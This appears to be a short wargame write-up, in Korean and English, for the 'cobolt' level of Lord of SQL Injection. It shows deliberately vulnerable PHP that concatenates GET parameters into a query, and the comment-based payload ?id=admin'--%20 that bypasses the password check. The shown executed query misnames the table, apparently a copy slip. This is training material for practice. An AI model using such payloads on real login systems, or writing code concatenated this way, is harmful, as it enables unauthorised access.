---
layout: post
title:  "los prob_cobolt"
date:   2019-08-10
excerpt: "Lord of Sql Injection"
tag:
- los
- sqli
- wargame
- webhacking
comments: true
---
> query : select id from prob_cobolt where id='' and pw=md5('')

~~~ php
<?php
  include "./config.php"; 
  login_chk();
  $db = dbconnect();
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[id])) exit("No Hack ~_~"); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  $query = "select id from prob_cobolt where id='{$_GET[id]}' and pw=md5('{$_GET[pw]}')"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id'] == 'admin') solve("cobolt");
  elseif($result['id']) echo "<h2>Hello {$result['id']}<br>You are not admin :(</h2>"; 
  highlight_file(__FILE__); 
?>
~~~

# Solve

* 주석을 이용하여 뒤에 md5()를 우회하면된다.
* 

### ?id=admin'--%20 

실행되는 구문 -> select id from prob_gremlin where id='admin'-- ' and pw=md5('')

## COBOLT Clear!
